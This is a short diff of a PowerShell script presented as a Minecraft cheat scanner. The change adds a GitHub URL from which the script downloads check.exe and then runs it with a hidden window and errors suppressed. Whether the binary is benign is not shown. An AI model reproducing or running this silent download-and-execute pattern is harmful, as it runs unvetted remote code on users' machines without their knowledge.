@@ -1,6 +1,6 @@
 # MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
     # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "" -OutFile "check.exe" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://github.com/doskaw/Checker/raw/refs/heads/main/check.exe" -OutFile "check.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
     Start-Process -FilePath "check.exe" -WindowStyle Hidden
